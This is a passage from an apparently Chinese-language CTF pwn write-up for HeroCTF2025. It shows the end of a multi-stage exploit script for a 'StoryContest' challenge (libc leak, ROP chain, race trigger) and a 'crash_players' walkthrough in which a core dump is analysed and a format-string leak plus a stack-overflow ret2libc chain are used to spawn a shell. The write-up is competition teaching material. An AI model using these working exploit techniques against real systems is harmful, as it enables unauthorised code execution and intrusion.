</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>error</span><span class=p>(</span><span class=s2>&#34;Failed to leak address!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>stage2_activate_bonus</span><span class=p>(</span><span class=n>libc_base</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    Stage 2: Activate bonus mode by calling bonus_entry(0x1337C0DE)
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    Uses ROP chain:
</span></span></span><span class=line><span class=cl><span class=s2>      pop rdi; ret
</span></span></span><span class=line><span class=cl><span class=s2>      0x1337C0DE
</span></span></span><span class=line><span class=cl><span class=s2>      bonus_entry
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;STAGE 2: Activating bonus mode&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Build ROP chain</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>libc</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># Try pwntools ROP first</span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rdi_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>LIBC_POP_RDI_OFFSET</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># Use hardcoded offset</span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rdi_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>LIBC_POP_RDI_OFFSET</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;pop rdi; ret @ </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>pop_rdi_addr</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># Build payload</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=sa>b</span><span class=s1>&#39;B&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=n>BUF_OFFSET</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_addr</span><span class=p>),</span>       <span class=c1># pop rdi; ret</span>
</span></span><span class=line><span class=cl>        <span class=n>p64</span><span class=p>(</span><span class=n>MAGIC_VALUE</span><span class=p>),</span>         <span class=c1># rdi = 0x1337C0DE</span>
</span></span><span class=line><span class=cl>        <span class=n>p64</span><span class=p>(</span><span class=n>BONUS_ENTRY_ADDR</span><span class=p>),</span>   <span class=c1># bonus_entry()</span>
</span></span><span class=line><span class=cl>        <span class=n>p64</span><span class=p>(</span><span class=n>GIFT_ADDR</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Payload length: </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;ROP chain: pop_rdi → </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>MAGIC_VALUE</span><span class=p>)</span><span class=si>}</span><span class=s2> → bonus_entry&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Trigger race condition</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;Triggering race condition to activate bonus...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>trigger_race_with_modifier</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Wait for execution</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>success</span><span class=p>(</span><span class=s2>&#34;Bonus mode should now be activated!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>stage3_get_flag</span><span class=p>(</span><span class=n>main_conn</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1>#pause()</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    Stage 3: Get the flag via show_public_results()
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;STAGE 3: Getting the flag&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Call show_public_results (menu choice 4)</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;Calling show_public_results()...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>send_menu_choice</span><span class=p>(</span><span class=n>main_conn</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Receive flag</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>main_conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;===&#39;</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;Flag:&#39;</span> <span class=ow>in</span> <span class=n>response</span> <span class=ow>or</span> <span class=sa>b</span><span class=s1>&#39;Hero{&#39;</span> <span class=ow>in</span> <span class=n>response</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>success</span><span class=p>(</span><span class=s2>&#34;FLAG CAPTURED!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>error</span><span class=p>(</span><span class=s2>&#34;Failed to get flag!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ==========================</span>
</span></span><span class=line><span class=cl><span class=c1># Main Exploit</span>
</span></span><span class=line><span class=cl><span class=c1># ==========================</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exploit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Main exploit function&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;StoryContest Exploit Starting...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Establish main connection</span>
</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;Connecting to server...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>main_conn</span> <span class=o>=</span> <span class=n>connect_to_server</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>success</span><span class=p>(</span><span class=s2>&#34;Main connection established&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Receive initial banner</span>
</span></span><span class=line><span class=cl>    <span class=n>main_conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;===&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># Stage 1: Leak libc</span>
</span></span><span class=line><span class=cl>        <span class=n>libc_base</span> <span class=o>=</span> <span class=n>stage1_leak_libc</span><span class=p>(</span><span class=n>main_conn</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>libc_base</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>error</span><span class=p>(</span><span class=s2>&#34;Stage 1 failed!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Stage 2: Activate bonus</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>stage2_activate_bonus</span><span class=p>(</span><span class=n>libc_base</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>error</span><span class=p>(</span><span class=s2>&#34;Stage 2 failed!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Stage 3: Get flag</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>stage3_get_flag</span><span class=p>(</span><span class=n>main_conn</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>success</span><span class=p>(</span><span class=s2>&#34;Exploit successful!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>error</span><span class=p>(</span><span class=s2>&#34;Stage 3 failed!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>finally</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>main_conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ==========================</span>
</span></span><span class=line><span class=cl><span class=c1># Alternative: Manual mode</span>
</span></span><span class=line><span class=cl><span class=c1># ==========================</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>manual_mode</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Interactive mode for manual exploitation&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span> <span class=o>=</span> <span class=n>connect_to_server</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ==========================</span>
</span></span><span class=line><span class=cl><span class=c1># Entry Point</span>
</span></span><span class=line><span class=cl><span class=c1># ==========================</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>MANUAL</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>manual_mode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>exploit</span><span class=p>()</span>
</span></span></code></pre></div><p>本地复现</p><p><img alt=image-20251202000121219 loading=lazy src=/posts/ctf/heroctf2025-writeup/assets/image-20251202000121219.png></p><h2 id=crash_players>crash_players<a hidden class=anchor aria-hidden=true href=#crash_players>#</a></h2><p>一道有意思的题，题目没有给<code>binary</code>，只给了一个<code>core dump</code>文件，也就是进行某个失败exp时的<code>dump</code>信息</p><p>写WP的时候没有远程环境，口述一下</p><p>有两个阶段的输入</p><ol><li>在提示<code>Name : </code>后输入一定内容，程序会回显</li><li>在提示<code>Description : </code>后输入一定内容，程序不会回显</li></ol><p><code>strings core</code>简单查看一下，关键的有</p><p><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code>疑似栈溢出时的填充</p><p><code>%4$p.%7$p.%19$p</code>格式化字符串利用</p><p><code>0x1.0x7ffe59ca1160.0x7fe92c7ae24a</code>格式化字符串输出（显然第二个是栈地址，第三个是libc地址）</p><p>接下来测试远程程序。</p><p>提示<code>Name : </code>后输入<code>%4$p.%7$p.%19$p</code>，成功泄露地址（只能口述，没有环境<code>:(</code>）</p><p>接下来<code>gdb</code>进一步查看<code>core</code>文件<code>gdc -c core</code></p><p><img alt=image-20251202000844613 loading=lazy src=/posts/ctf/heroctf2025-writeup/assets/image-20251202000844613.png></p><p>可以推测在提示<code>Description : </code>后输入一定内容，存在栈溢出，推测崩的时候<code>RBP</code>是<code>0x4141414141414141</code>，显然进行了<code>leave</code>，而<code>RIP</code>还是正常地址，不是<code>libc</code>地址，所以死在了<code>ret</code></p><p>查看<code>libc</code>基地址，从而计算<code>AAAAAAAA</code>后的3个<code>libc</code>地址偏移，顺便看看是什么</p><p>计算后得出是<code>pop rdi; ret</code>,<code>binsh_addr</code>,<code>system</code></p><p>接下来看看<code>ROP</code>填充的A的数量，为<code>0x30</code></p><p><img alt=image-20251202001328571 loading=lazy src=/posts/ctf/heroctf2025-writeup/assets/image-20251202001328571.png></p><p>通过上图发现<code>ret</code>的时候<code>rsp</code>还指着<code>AAAAAAAA</code>，所以想要覆盖到返回地址填充<code>0x28</code>即可</p><p><code>payload = b'A' * 0x28 + p64(libc_base + 0x277e5) + p64(libc_base + 0x197031) + p64(libc_base + 0x4c490)</code></p><p>这样发给<code>Description：</code>后并没有成功<code>get shell</code>，原因是<code>system</code>没有<code>0x10</code>对齐，所以应该改成</p><p><code>payload = b'A' * 0x28 + p64(libc_base + 0x277e5) + p64(libc_base + 0x197031) + p64(libc_base + 0x277e5 + 1) + p64(libc_base + 0x4c490)</code></p><blockquote><p>p64(libc_base + 0x277e5 + 1)是ret</p></blockquote><p>即可</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#context.terminal = [&#39;tmux&#39;, &#39;new-window&#39;, &#39;-n&#39;, &#39;debug&#39; ]</span>
</span></span><span class=line><span class=cl><span class=n>libcname</span> <span class=o>=</span> <span class=s2>&#34;./libc.so.6&#34;</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;dyn07.heroctf.fr&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>11454</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>libcname</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>libcname</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sa</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sla</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span> <span class=o>=</span> <span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>=</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;%4$p.%7$p.%19$p&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s2>&#34;Name : &#34;</span><span class=p>,</span> <span class=n>payload1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span> <span class=n>base</span> <span class=o>=</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span> <span class=n>base</span> <span class=o>=</span> <span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x2724a</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;libc_base: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mh>0x28</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x277e5</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x197031</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x277e5</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x4c490</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s2>&#34;Description : &#34;</span><span class=p>,</span> <span class=n>payload2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=next href=https://wgggggggg.github.io/posts/ctf/sknbctf2025-writeup/><span class=title>Next »</span><br><span>sknbCTF2025 PWN Writeup</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share HeroCTF2025 PWN Writeup on x" href="https://x.com/intent/tweet/?text=HeroCTF2025%20PWN%20Writeup&amp;url=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fheroctf2025-writeup%2f&amp;hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HeroCTF2025 PWN Writeup on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fheroctf2025-writeup%2f&amp;title=HeroCTF2025%20PWN%20Writeup&amp;summary=HeroCTF2025%20PWN%20Writeup&amp;source=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fheroctf2025-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HeroCTF2025 PWN Writeup on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fheroctf2025-writeup%2f&title=HeroCTF2025%20PWN%20Writeup"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HeroCTF2025 PWN Writeup on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fheroctf2025-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HeroCTF2025 PWN Writeup on whatsapp" href="https://api.whatsapp.com/send?text=HeroCTF2025%20PWN%20Writeup%20-%20https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fheroctf2025-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 